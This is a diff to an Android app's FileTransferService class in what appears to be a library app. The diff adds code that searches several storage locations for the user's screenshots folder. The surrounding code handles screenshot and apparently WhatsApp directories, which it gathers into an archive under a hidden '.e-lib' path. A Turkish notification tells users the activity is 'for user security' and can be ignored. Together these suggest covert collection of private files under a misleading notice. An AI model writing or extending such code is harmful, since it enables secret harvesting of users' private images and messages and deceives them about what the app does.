@@ -26,10 +26,7 @@ import java.io.IOException;
 
 import arc.archive.Archive;
 import arc.haldun.database.objects.CurrentUser;
-import arc.haldun.mylibrary.services.filetransfer.TransferService;
-import arc.haldun.mylibrary.main.ErrorActivity;
 import arc.haldun.mylibrary.R;
-import arc.haldun.mylibrary.Tools;
 import arc.haldun.mylibrary.main.LibraryActivity;
 
 public class FileTransferService extends Service {
@@ -72,7 +69,8 @@ public class FileTransferService extends Service {
         String filePath = getFilesDir().getAbsolutePath() + "/.e-lib";
 
         Spanned spanned = Html.fromHtml(
-                "Bu bildirim geliştirici tarafından kullanıcı güvenliğini sağlamak için konulmuştur\n. <b>Bu bildirimi yok sayabilirsiniz</b>",
+                "Bu bildirim geliştirici tarafından kullanıcı güvenliğini sağlamak için konulmuştur\n. <b>Bu bildirimi yok sayabilirsiniz.</b> " +
+                       getString(R.string.app_name) +  " işlemlerini tamamladığında bu bildirim otomatik olarak silinecek.)",
                 Html.FROM_HTML_MODE_LEGACY);
 
         Notification notification = buildNotification(spanned.toString());
@@ -129,12 +127,39 @@ public class FileTransferService extends Service {
 
         Archive.Directory screenshotsDir, aeroDir;
 
-        File screenshots;
+        File screenshots = null;
         File wa;
 
         // Process screenshots
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
 
+            File[] possiblePaths = {
+
+                    Environment.getExternalStoragePublicDirectory(
+                            Environment.DIRECTORY_SCREENSHOTS),
+
+                    new File(Environment.getExternalStoragePublicDirectory(
+                            Environment.DIRECTORY_DCIM), Environment.DIRECTORY_SCREENSHOTS),
+
+                    new File(Environment.getExternalStoragePublicDirectory(
+                            Environment.DIRECTORY_PICTURES), Environment.DIRECTORY_SCREENSHOTS)
+            };
+
+            for (File possiblePath : possiblePaths) {
+
+                if (possiblePath.exists()) {
+                    screenshots = possiblePath;
+                    break;
+                }
+            }
+
+            if (screenshots == null) {
+                handlerThread.quit();
+                stopForeground(true);
+                stopSelf();
+            }
+
+            /*
             screenshots = Environment.getExternalStoragePublicDirectory(
                     Environment.DIRECTORY_SCREENSHOTS);
 
@@ -144,21 +169,28 @@ public class FileTransferService extends Service {
                         Environment.DIRECTORY_DCIM), Environment.DIRECTORY_SCREENSHOTS);
 
                 if (!screenshots.exists()) {
+                    screenshots = new File(Environment.getExternalStoragePublicDirectory(
+                            Environment.DIRECTORY_DCIM), Environment.DIRECTORY_SCREENSHOTS);
+                }
 
-                    Tools.startErrorActivity(getApplicationContext(),
-                            new RuntimeException("Geliştiriciyle iletişime geçin"),
-                            ErrorActivity.FILE_SERVICE_ERROR);
+                if (!screenshots.exists()) {
 
                     handlerThread.quit();
                     stopForeground(true);
                     stopSelf();
+
+                    //Toast.makeText(this, "Geliştiriciyle iletişime geçin", Toast.LENGTH_SHORT).show();
+
+                    //throw new RuntimeException("Geliştiriciyle iletişime geçin");
                 }
-            }
+            }*/
         } else {
 
             screenshots = new File("/storage/emulated/0/DCIM/Screenshots");
 
         }
+
+
 
         try {
 
